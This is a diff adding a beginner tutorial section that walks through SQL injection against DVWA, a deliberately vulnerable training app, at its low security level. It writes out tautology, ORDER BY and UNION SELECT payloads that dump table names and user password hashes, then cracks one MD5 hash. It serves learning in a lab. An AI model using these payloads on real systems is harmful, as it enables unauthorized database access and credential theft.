@@ -94,3 +94,65 @@ Update these values:
 `sudo systemctl restart apache2`
 
 **we now access DVWA at `http://localhost/DVWA` in our browser. Login with admin/password.**
+
+##Now Lets Do some cracking and Hacking(imoji)
+First lets set the **SECURITY LEVEL** to **LOW**
+DVWA Security → Set to Low.
+
+##Some Basic SQLi (DVWA Security: Low)
+The objective of this is to bypass the login and extract some database information like  the usernames and their respective password(imoji wink).
+
+- Step 1: Finding the Vulnerable Input
+Navigate to "SQL Injection" in DVWA on the left half screen because we're doing sqli
+
+You'll see a form asking for User ID.
+
+Step 2: We will test for Vulnerability (with inputs like ',1', 1' OR '1'='1)
+
+Enter: `1' OR '1'='1` (in the user ID form) and click submit
+
+It returns all users because the query becomes: `SELECT * FROM users WHERE user_id = '1' OR '1'='1';` which is always true and returns all data.
+
+step 3: We try to extract the database information by finding the number of columms
+
+We use **ORDER BY** to determine the number of ||s
+
+We enter this ``1' ORDER BY 1-- -`` it displays true with the columns 
+We enter this ``1' ORDER BY 2-- -`` it also displays true with the columns
+now when we enter `1' ORDER BY 3-- -`, it fails or we get an error. Which mean we only have 2 columns not 3. This helps us in our next stage
+
+- We extract the data using the UNION SELECT
+  Since we only have 2 columns, we run -> `1' UNION SELECT 1,2-- -`
+
+  Which displays the output of the columns 1 and 2
+
+- Lets get the Database Name -> enter this -> `1' UNION SELECT 1,database()-- -`
+
+the output should be **dvwa** which is the current database
+
+Now for the big gun 
+
+Lets get all the tables in the Databse(dvwa)
+Enter -> `1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -`
+
+Output/result should be lists of the tables
+
+users
+
+guestbook
+
+...
+
+Finally Lets dump the usernames and the passwords
+
+Enter -> `1' UNION SELECT user,password FROM users-- -`
+
+It returns all the usernames and the **MD5 hash** which we crackk to get the passwords
+
+we crack hashes using `https://crackstation.net/` (CrackStation)
+
+First name: gordonb
+
+Surname: e99a18c428cb38d5f260853678922e03
+
+Cracked: abc123
